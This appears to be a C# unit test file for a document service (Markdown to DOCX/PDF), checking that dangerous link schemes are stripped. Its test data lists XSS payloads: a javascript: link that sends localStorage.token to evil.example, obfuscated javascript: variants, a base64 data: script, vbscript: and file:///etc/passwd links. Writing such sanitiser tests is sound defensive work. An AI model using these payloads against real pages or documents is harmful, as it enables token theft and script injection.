using System.Text;
using DocumentFormat.OpenXml.Packaging;

namespace DocService.Tests;

public class LinksTests
{
    const string PayloadSec07 = "[Ver detalhes da vaga](javascript:fetch('https://evil.example/?t='+localStorage.token))";

    public static TheoryData<string> Perigosos => new()
    {
        PayloadSec07,
        "[Ver detalhes da vaga](JaVaScRiPt:alert(1))",
        "[Ver detalhes da vaga]( javascript:alert(1))",
        "[Ver detalhes da vaga](&#106;avascript:alert(1))",
        "[Ver detalhes da vaga](&#x6A;avascript&#58;alert(1))",
        "[Ver detalhes da vaga](java&#x09;script:alert(1))",
        "[Ver detalhes da vaga](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
        "[Ver detalhes da vaga](vbscript:msgbox(1))",
        "[Ver detalhes da vaga](file:///etc/passwd)",
        "[Ver detalhes da vaga](/relativo)",
    };

    static string Documento(string link) => $"# Nome\n\n## Experiencia\n\n- {link}\n";

    [Theory]
    [MemberData(nameof(Perigosos))]
    public void ParserDescartaEsquemaForaDaAllowlist(string link)
    {
        var spans = MarkdownParser.Parse(Documento(link)).SelectMany(elemento => elemento.Spans).ToList();
        Assert.Contains(spans, span => span.Text.Contains("Ver detalhes da vaga"));
        Assert.All(spans, span => Assert.Null(span.Url));
    }

    [Theory]
    [InlineData("[Site](https://exemplo.dev/vaga)", "https://exemplo.dev/vaga")]
    [InlineData("[Site](HTTP://exemplo.dev)", "http://exemplo.dev/")]
    [InlineData("[Email](mailto:pessoa@exemplo.dev)", "mailto:pessoa@exemplo.dev")]
    public void ParserMantemHttpHttpsEMailto(string link, string esperado)
    {
        var spans = MarkdownParser.Parse(Documento(link)).SelectMany(elemento => elemento.Spans);
        Assert.Contains(spans, span => span.Url == esperado);
    }

    [Theory]
    [MemberData(nameof(Perigosos))]
    public void DocxNaoCriaHyperlinkPerigoso(string link)
    {
        var bytes = DocxRenderer.Render(MarkdownParser.Parse(Documento(link)));
        using var documento = WordprocessingDocument.Open(new MemoryStream(bytes), false);
        var principal = documento.MainDocumentPart!;
        Assert.Empty(principal.HyperlinkRelationships);
        Assert.Contains("Ver detalhes da vaga", principal.Document.Body!.InnerText);
    }

    [Fact]
    public void DocxBloqueiaSpanComUrlPerigosaMesmoForaDoParser()
    {
        var elementos = new[]
        {
            new DocElement(ElementKind.Paragraph, new[] { new DocSpan("Ver detalhes da vaga", false, "javascript:alert(1)") }),
        };
        using var documento = WordprocessingDocument.Open(new MemoryStream(DocxRenderer.Render(elementos)), false);
        Assert.Empty(documento.MainDocumentPart!.HyperlinkRelationships);
    }

    [Fact]
    public void DocxMantemLinkHttps()
    {
        var bytes = DocxRenderer.Render(MarkdownParser.Parse(Documento("[Site](https://exemplo.dev/vaga)")));
        using var documento = WordprocessingDocument.Open(new MemoryStream(bytes), false);
        var relacao = Assert.Single(documento.MainDocumentPart!.HyperlinkRelationships);
        Assert.Equal("https://exemplo.dev/vaga", relacao.Uri.AbsoluteUri);
    }

    [Theory]
    [MemberData(nameof(Perigosos))]
    public void PdfNaoCriaLinkPerigoso(string link)
    {
        var pdf = Encoding.Latin1.GetString(PdfRenderer.Render(MarkdownParser.Parse(Documento(link))));
        Assert.DoesNotContain("/URI", pdf);
        Assert.DoesNotContain("javascript", pdf, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void PdfMantemLinkHttps()
    {
        var pdf = Encoding.Latin1.GetString(PdfRenderer.Render(MarkdownParser.Parse(Documento("[Site](https://exemplo.dev/vaga)"))));
        Assert.Contains("https://exemplo.dev/vaga", pdf);
    }
}
